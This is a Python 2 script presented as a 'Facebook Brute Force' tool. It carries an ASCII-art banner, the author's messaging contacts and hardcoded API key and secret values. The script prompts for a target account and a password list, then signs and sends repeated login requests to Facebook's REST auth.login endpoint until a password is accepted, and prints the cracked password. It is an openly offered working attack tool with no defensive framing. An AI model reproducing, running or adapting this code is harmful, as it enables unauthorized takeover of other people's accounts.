
import os
import sys
import urllib
import hashlib

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

__banner__ = """
\033[1;92m	
                     .ed$$$" ""$$$$$be.
                   -"           ^""**$$$e.
                 ."                   '$$$c
                /                      "4$$b
               d  3                      $$$$
               $  *                   .$$$$$$
              .$  ^c           $$$$$e$$$$$$$$.
              d$L  4.         4$$$$$$$$$$$$$$b
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                  "$   "%*ebJLzb$e$$$$$b $P"
                    %..      4$$$$$$$$$$ "
                     $$$e   z$$$$$$$$$$%
                      "*$c  "$$$$$$$P"
                       .""$"*$$$$$$$$bc
                    .-"    .$***$$$""$"*e.
                 .-"    .e$"     "*$c  ^*b.
          .=*$"$"    .e$*"          "*bc  "*$e..
        .$"        .z*"               ^*$e.   "*****e.
        $$ee$c   .d"                     "*$.        3.
        ^*$E")$..$"                         *   .ee==d%
           $.d$$$*         Whisper          *  J$$$e*
            $$$$                            "$$$"
Author : Whisper
WhatsApp : +213673336272
Telegram : @itzthedevil
=============================================================
"""
os.system("clear")
print __banner__
print("\033[1;91m[+] Facebook Brute Force\n")
userid = raw_input("[*] Enter [Email|Phone|Username|ID]: ")
try:
	passlist = raw_input("[*] Set PATH to passlist: ")
	if os.path.exists(passlist) != False:
		print("[+] Account to crack : {}".format(userid))
		print("[+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
		print("[+] Cracking, please wait ...")
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
			sys.stdout.flush()
			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
			xx = hashlib.md5(sig).hexdigest()
			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
			if "error" in response:
				pass
			else:
				print("\n\n[+] Password found .. !!")
				print("\n[+] Password : {}".format(passwd.strip()))
				break
		print("\n\n[!] Done .. !!")
	else:
		print("FBWhisper: error: No such file or directory")
except KeyboardInterrupt:
	print("FBWhisper: error: Keyboard interrupt")